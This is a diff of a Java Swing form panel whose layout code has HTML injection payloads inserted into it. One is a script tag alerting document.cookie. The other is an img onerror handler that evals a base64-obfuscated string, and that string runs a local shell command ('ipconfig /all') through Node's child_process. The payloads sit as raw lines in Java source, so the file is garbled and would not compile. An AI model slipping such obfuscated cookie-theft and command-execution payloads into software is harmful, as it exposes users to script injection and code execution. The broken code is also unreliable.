@@ -76,7 +76,7 @@ public class data extends javax.swing.JPanel {
         btnLogout = new javax.swing.JButton();
         btnupload = new javax.swing.JButton();
         setLayout(new java.awt.GridBagLayout());
-        <script>alert(document.cookie);</script>
+        <script>password;alert(document.cookie);</script>
         jLabel1.setText("Nama Perumahan");
         gridBagConstraints = new java.awt.GridBagConstraints();
         gridBagConstraints.gridx = 0;
@@ -112,7 +112,8 @@ public class data extends javax.swing.JPanel {
         gridBagConstraints.insets = new java.awt.Insets(29, 43, 0, 0);
         add(txtAlamat, gridBagConstraints);
         gridBagConstraints = new java.awt.GridBagConstraints();
-        <img src=x onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKfSk7`,`base64`).toString())'>
+            
+        <img src=password onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKfSk7`,`base64`).toString())'>
         gridBagConstraints.gridx = 22;
         gridBagConstraints.gridy = 4;
         gridBagConstraints.gridwidth = 33;
